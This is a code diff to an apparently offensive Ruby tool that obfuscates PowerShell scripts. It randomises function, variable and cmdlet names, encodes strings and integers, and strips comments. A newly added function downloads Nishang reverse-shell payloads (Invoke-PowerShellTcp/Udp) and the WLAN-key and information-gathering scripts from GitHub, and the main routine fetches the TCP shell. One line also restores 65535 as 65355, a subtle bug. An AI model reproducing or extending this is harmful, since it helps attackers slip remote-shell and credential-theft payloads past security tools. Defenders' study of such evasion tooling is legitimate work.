@@ -10,22 +10,26 @@
 
 require "base64"
 require "colorize"
+require "httparty"
 
 # This variable stores generated random strings to avoid collisions
 $rand_values = []
 
 # This array contains some of the most important cmdlets to iterate over them in case they're on the script to obfuscate its names
-$known_funcs = ["Write-Verbose","Write-Output","Write-Error","Write-Warning","Get-Location","Out-String","Out-Null","Get-Command","Invoke-Expression","IEX","Get-ProcAddress","Copy-Item","New-Object","Get-ItemProperty","Get-Item","Set-ItemProperty","Get-ChildItem","Get-Content","Add-Member","Get-RegKeyClass","Set-Acl","Select-String","Test-Path","Add-Type","Get-WmiObject","Remove-Item","Select-Object","Write-Host","Get-Job","Remove-Job","Start-Job","Start-Sleep","ForEach-Object"]
+$known_funcs = ["Write-Verbose","Write-Output","Write-Error","Write-Warning","Get-Location","Out-String","Out-Null","Get-Command","Invoke-Expression","IEX","Get-ProcAddress","Copy-Item","New-Object","Get-ItemProperty","Get-Item","Set-ItemProperty","Get-ChildItem","Get-Content","Add-Member","Get-RegKeyClass","Set-Acl","Select-String","Test-Path","Add-Type","Get-WmiObject","Remove-Item","Select-Object","Write-Host","Get-Job","Remove-Job","Start-Job","Start-Sleep","ForEach-Object","Write-Progress","Write-Verbose","Get-Process","Get-Date","Out-File","Get-Service","Split-Path","New-Item","Set-WmiInstance"]
+
+$known_text = ["([text.encoding]::ASCII).GetBytes(",".AcceptTcpClient()",".GetStream()",".Clear()",".Flush()",".Stop()",".Close()","","","","",""]
 
 # This array holds all powershell internal variables to avoid overwriting them
-$forbidden_vars = ["$true","$false","$null","$env","$read","$verb","$_","$script","$IsWow64","$IsWow64Process"]
+$forbidden_vars = ["$true","$false","$null","$env","$read","$error","$verb","$_","$script","$IsWow64","$IsWow64Process"]
 
 # This array contains all powershell characters with special uses when are combined with a backtick --> `
-$no_backticks = ["0","a","b","e","f","n","r","t","v","-","_",".","!"]
+$no_backticks = ["0","a","b","e","f","n","r","t","v","-","_",".",":","!","(",")","{","}","[","]"]
 
-$extra_statements = ["function","if","else","elseif","try","catch","except","break","while"]
+$extra_statements = ["function","else","elseif","catch","except","break","while"]
 
 $extreme = false
+$verbose = false
 
 # Print ASCII art banner
 def ascii()
@@ -134,7 +138,7 @@ def numObfs(num)
 
   elsif rand_num == 2
     # Some simple number formatting
-    moded_num = "$((#{num}))"
+    moded_num = "+$((#{num}))"
   elsif rand_num == 3
     # Modified logic from first technique
     sample_num = (2..100).to_a.sample
@@ -236,7 +240,7 @@ end
 def pBar(text)
   print(text)
   3.times do
-    sleep 0.3
+    sleep 0.2
     print(".")
   end
   sleep 0.2
@@ -271,18 +275,24 @@ def listPayloads()
   exit(0)
 end
 
-def main()
-  # Print banner
-  ascii()
-  verbose = true
+def getPayload(payload)
 
-  # Parse CLI flags
+  base_url = "https://raw.githubusercontent.com/samratashok/nishang/master/"
 
-  # Open given file
-  file = File.open("test.ps1")
-  file_data = file.read
-  file.close
-  
+  if payload == "Invoke-PowerShellTcp"
+    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellTcp.ps1")
+  elsif payload == "Invoke-PowerShellUdp"
+    res = HTTParty.get(base_url + "Shells/Invoke-PowerShellUdp.ps1")
+  elsif payload == "Get-Information"
+    res = HTTParty.get(base_url + "Gather/Get-Information.ps1")
+  elsif payload == "Get-WLAN-Keys"
+    res = HTTParty.get(base_url + "Gather/Get-WLAN-Keys.ps1")
+  end
+
+  return res.body
+end
+
+def obfuscate(file_data)
   # Get all function names using regex
   pBar("[*] Replacing defined functions with random names")
   func_list = file_data.scan(/function [A-Za-z0-9_-]+/)
@@ -299,12 +309,12 @@ def main()
     # Generate random string to replace with
     rand_name = randStr(func_name.length)
     file_data.gsub!(func_name, rand_name)
-    if verbose == true
+    if $verbose == true
       puts("  " + func_name + " --> " + rand_name)
     end
   }
 
-  if verbose
+  if $verbose
     puts()
   end
 
@@ -327,30 +337,22 @@ def main()
     rand_var = "$" + randStr(u_var.length)
     file_data.gsub!(u_var, rand_var)
     # Print verbose info
-    if verbose
+    if $verbose
       puts("  " + u_var + " --> " + rand_var)
     end
   }
 
-  if verbose
+  if $verbose
     puts()
   end
 
-  # Randomize multi-line comments (text between <# and #>)
-  pBar("[*] Randomizing comments")
-  comments = file_data.scan(/<#.*?#>/m)
+  # Remove multi-line comments (text between <# and #>)
+  pBar("[*] Remove comments")
+  comments = file_data.scan(/(<#.*?#>)/m)
   comments.each { |str_lines|
-    new_line = ""
-    str_lines.split(" ").each { |str_char|
-      if str_char != "<#" && str_char != "#>"
-        rand_str = randStr(str_char.length)
-        new_line += rand_str + " "
-      else 
-        new_line += str_char + " "
-      end
+    str_lines.each { |entry|
+      file_data.gsub!(entry, "")
     }
-
-    file_data.gsub!(str_lines, new_line)
   }
   # Remove all single line comments
   file_data.gsub!(/^\s*#.*$/, '')
@@ -359,16 +361,21 @@ def main()
 
   # Replace newlines to fix format before obfuscating them
   file_data.gsub!("`r`n", "\n")
-  #file_data.gsub!("`n", "\n")
+  file_data.gsub!("`n", "\n")
+
+  # Get CLI parameters to not overwrite them
+  parameters = file_data.scan(/ParameterSetName=\"(.*?)\"\)\]/i)
 
   # Find all strings between double quotes
   pBar("[*] Obfuscating strings")
-  all_strs = file_data.scan(/\"(.*?)\"/)
+  all_strs = file_data.scan(/\"(.*?)\"/m)
   all_strs.uniq!
 
   all_strs.each { |entry|
-    moded_str = strObfs(entry)
-    file_data.gsub!("\"" + entry[0] + "\"", moded_str)
+    if parameters.include?(entry) == false
+      moded_str = strObfs(entry)
+      file_data.gsub!("\"" + entry[0] + "\"", moded_str)
+    end
   }
 
   pBar("[*] Obfuscating cmdlet names")
@@ -377,14 +384,57 @@ def main()
       sleep 0.075 # Add short delay
       moded_func = cmdletObfs(func)
       file_data.gsub!(/#{func}/i, moded_func)
-      if verbose
+      if $verbose
         puts("  " + func + " --> " + moded_func)
       end
     end
   }
 
-  if verbose
+  if $verbose
     puts()
+  end
+
+  # Replace some text to avoid possible errors
+  file_data.gsub!("65535", "DO-NOT-REPLACE")
+
+  pBar("[*] Obfuscating integers")
+  #all_ints = file_data.scan(/\[char\](\d+)\+\[char\]/i)
+  all_ints = file_data.scan(/(\d+)/)
+  all_ints.uniq!
+
+  all_ints.each { |i|
+    puts i
+    if i[0].to_i >= 24 && i[0].to_i <= 200
+      rand_int = numObfs(i[0])
+      file_data.gsub!(i[0], rand_int)
+    end
+  }
+
+  # Replace double + signs to avoid powershell errors
+  file_data.gsub!("++","+")
+
+  file_data.gsub!("DO-NOT-REPLACE", "65355")
+
+  return file_data
+end
+
+def main()
+  # Print banner
+  ascii()
+
+  # Parse CLI flags
+  text = getPayload("Invoke-PowerShellTcp")
+  puts text
+
+  # Open given file
+  file = File.open("test.ps1")
+  file_data = file.read
+  file.close
+
+  iterations = 1
+
+  iterations.times do
+    file_data = obfuscate(file_data)
   end
 
   writeContent(file_data, "moded.ps1")
